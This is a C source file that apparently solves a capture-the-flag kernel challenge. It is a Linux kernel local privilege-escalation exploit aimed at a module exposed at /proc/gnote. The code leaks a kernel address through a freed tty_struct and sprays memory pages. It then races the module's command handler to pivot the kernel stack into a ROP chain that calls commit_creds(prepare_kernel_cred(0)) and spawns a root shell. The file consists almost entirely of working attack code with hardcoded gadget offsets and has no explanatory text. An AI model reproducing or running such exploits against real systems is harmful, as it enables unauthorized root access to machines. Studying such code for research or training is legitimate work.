// gcc exploit.c -masm=intel -pthread -fno-PIE -static -no-pie -o exploit
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>

#define PAGE_SIZE 0x1000

static void dump(void *buf, unsigned int size);

struct state {
	unsigned long rip;
	unsigned long cs;
	unsigned long rflags;
	unsigned long rsp;
	unsigned long ss;
} state;

void get_root(void* func);
void shell(void);

static void save_state(void);
static void restore_state(void);


/* exploit */
#define BASE          0xffffffff81000000
#define OFFSET(addr)  ((addr) - (BASE))
#define ADDR(offset)  (kernel_base + (offset))

unsigned long kernel_base             = 0;
unsigned long ofs_release_one_tty     = OFFSET(0xffffffff812ab1e0);

unsigned long ofs_prepare_kernel_cred = OFFSET(0xffffffff81069fe0);
unsigned long ofs_commit_creds        = OFFSET(0xffffffff81069df0);
unsigned long ofs_swapgs_restore_regs_and_return_to_usermode = OFFSET(0xffffffff81600a34);

unsigned long ofs_stack_pivot         = OFFSET(0xffffffff8154602c); // mov esp, 0x5D000000 ; ret
unsigned long ofs_pop_rdi             = OFFSET(0xffffffff8101c20d);	// pop rdi ; ret
unsigned long ofs_pop_rcx             = OFFSET(0xffffffff81037523);	// pop rcx ; ret
unsigned long ofs_mov_rdi_rax         = OFFSET(0xffffffff81018eef); // mov rdi, rax ; rep movsq  ; pop rbp ; ret

struct cred* (*prepare_kernel_cred)(struct task_struct *daemon); 
int (*commit_creds)(struct cred *new);

struct command {
	unsigned int menu;
	unsigned int data;
} cmd;

struct userfault_args {
	int uffd;
	void *init_page;
};

static void *race(void *args);
static void gn_add(int fd, unsigned int size);
static void gn_select(int fd, int idx);

static void *pagespray(void *addr, size_t len);
static int set_userfault(void *addr, size_t len, void *init_page);
static void *userfault_handler(void *args);

int main(void){
	int fd, ptmx_fd;
	unsigned long tty_struct[0x400/sizeof(unsigned long)];
	unsigned long *stack;

	save_state();
	state.rip = shell;

	if((fd = open("/proc/gnote", O_RDWR|O_CLOEXEC)) < 0){
		perror("/proc/gnote");
		return -1;
	}

	if((ptmx_fd = open("/dev/ptmx", O_RDWR|O_NOCTTY)) < 0){
		perror("/dev/ptmx");
		return -1;
	}
	close(ptmx_fd);
	
	gn_add(fd, 0x400);
	gn_select(fd, 0);
	read(fd, tty_struct, 0x400);

	//dump(tty_struct, 0x400);
	unsigned long release_one_tty	= tty_struct[0x4a];
	unsigned long kernel_base		= release_one_tty - ofs_release_one_tty;

	printf("kernel_base	 = %p\n", kernel_base);
	if(kernel_base & (PAGE_SIZE-1))
		return -1;

	// kernel module : 0xffffffffc0xxx000 (xxx > 0)
	unsigned long *base = pagespray(0xf000000, 0x1000000);
	base[0x13] = ADDR(ofs_stack_pivot);

	stack = (unsigned long*)mmap((void*)(0x5d000000-0x1000), 0x2000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED|MAP_POPULATE, -1, 0);
	memset(stack, 0, 1);

	stack += (0x1000/sizeof(unsigned long));
	*(stack++) = ADDR(ofs_pop_rdi);
	*(stack++) = 0;
	*(stack++) = ADDR(ofs_prepare_kernel_cred);
	*(stack++) = ADDR(ofs_pop_rcx);
	*(stack++) = 0;
	*(stack++) = ADDR(ofs_mov_rdi_rax);
	*(stack++) = 0xdeadbeef;
	*(stack++) = ADDR(ofs_commit_creds);

	*(stack++) = ADDR(ofs_swapgs_restore_regs_and_return_to_usermode) + 0x16;
	*(stack++) = 0xdeadbeef;
	*(stack++) = 0xcafebabe;
	memcpy(stack, &state, sizeof(state));

	pthread_t pthread;
	pthread_create(&pthread, NULL, &race, NULL);

	// function table offset : 0x1098
	for(;;){
		cmd.menu = 2;
		write(fd, &cmd, sizeof(cmd));
	}
}

static void *race(void *args){
	for(;;){
		cmd.menu = 0x4f000000/8;
	}
}
static void gn_add(int fd, unsigned int size){
	cmd.menu = 1;
	cmd.data = size;
	write(fd, &cmd, sizeof(cmd));
}

static void gn_select(int fd, int idx){
	cmd.menu = 5;
	cmd.data = idx;
	write(fd, &cmd, sizeof(cmd));
}

static void *pagespray(void *addr, size_t len){
	int memfd = -1;
	void *mem, *init_page;

	if((memfd = memfd_create("memfd", MFD_CLOEXEC)) > 0)
		ftruncate(memfd, PAGE_SIZE);

	if((init_page = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, memfd > 0 ? MAP_SHARED : MAP_ANONYMOUS|MAP_PRIVATE, memfd, 0)) == MAP_FAILED){
		perror("mmap");
		goto FAIL;
	}
	memset(init_page, 0 , 1);

	/*
	if((mem = mmap(addr, len, PROT_READ, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0)) == MAP_FAILED){
		perror("mmap");
		goto FAIL;
	}

	if(set_userfault(mem, len, init_page) < 0){
		munmap(mem, len);
	*/

		if(memfd < 0)
			goto FAIL;
		for(unsigned ofs = 0; ofs < len; ofs += PAGE_SIZE)
			if(mmap(addr + ofs, PAGE_SIZE, PROT_READ, MAP_SHARED|MAP_FIXED, memfd, 0) == MAP_FAILED){
				perror("mmap");
				goto FAIL;
			}
	//}

	return init_page;

FAIL:
	if(init_page > 0)
		munmap(init_page, PAGE_SIZE);
	if(memfd > 0)
		close(memfd);
	return MAP_FAILED;
}

/*
static int set_userfault(void *addr, size_t len, void *init_page){
	int uffd;
	struct uffdio_api uffdio_api = {
		.api = UFFD_API,
		.features = 0
	};
	struct uffdio_register uffdio_register = {
		.mode = UFFDIO_REGISTER_MODE_MISSING,
		.range = {
			.start = (unsigned long)addr,
			.len = len 
		},
	};

	if((uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK)) < 0){
		perror("userfaultfd");
		return -1;
	}

	ioctl(uffd, UFFDIO_API, &uffdio_api);
	ioctl(uffd, UFFDIO_REGISTER, &uffdio_register);

	struct userfault_args *args = malloc(sizeof(struct userfault_args));
	args->uffd = uffd;
	args->init_page = init_page;
	pthread_t uffd_thread;
	pthread_create(&uffd_thread, NULL, userfault_handler, args);

	return 0;
}

static void *userfault_handler(void *args){
	int uffd = ((struct userfault_args*)args)->uffd;
	void *init_page = ((struct userfault_args*)args)->init_page;

	for (;;) {
		struct uffd_msg msg;
		struct pollfd pollfd = {
			.fd = uffd,
			.events = POLLIN,
		};

		poll(&pollfd, 1, 2000);
		read(uffd, &msg, sizeof(msg));

		if (msg.event & UFFD_EVENT_PAGEFAULT) {
			struct uffdio_copy copy = {
				.src = (unsigned long)init_page,
				.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1),
				.len = PAGE_SIZE,
				.mode = 0,
				.copy = 0,
			};
			ioctl(uffd, UFFDIO_COPY, &copy);
		}
	}
	return NULL;
}
*/

/* auxiliary functions */
static void save_state(void) {
	register long *rsp asm("rsp");

	asm(
	"mov rax, ss\n"
	"push rax\n"
	"lea rax, [rsp+0x18]\n"
	"push rax\n"
	"pushfq\n"
	"mov rax, cs\n"
	"push rax\n"
	"mov rax, [rbp+8]\n"
	"push rax\n"
	);
	memcpy(&state, rsp, sizeof(state));
    asm("add rsp, 0x28");
}

static void restore_state(void){
	register long *rsp asm("rsp");

    asm("sub rsp, 0x28");
	memcpy(rsp, &state, sizeof(state));
    asm(
	"swapgs\n"
	"iretq"
	);
	__builtin_unreachable();
}

void get_root(void* func){
	commit_creds(prepare_kernel_cred(0));

	state.rip = func;
	restore_state();
}

void shell(void){
	char *argv[] = {"/bin/sh", NULL};
	execve(argv[0], argv, NULL);
}

static void dump(void *buf, unsigned int size){
	unsigned long *p = buf;

	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(unsigned int i=0; i<size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}
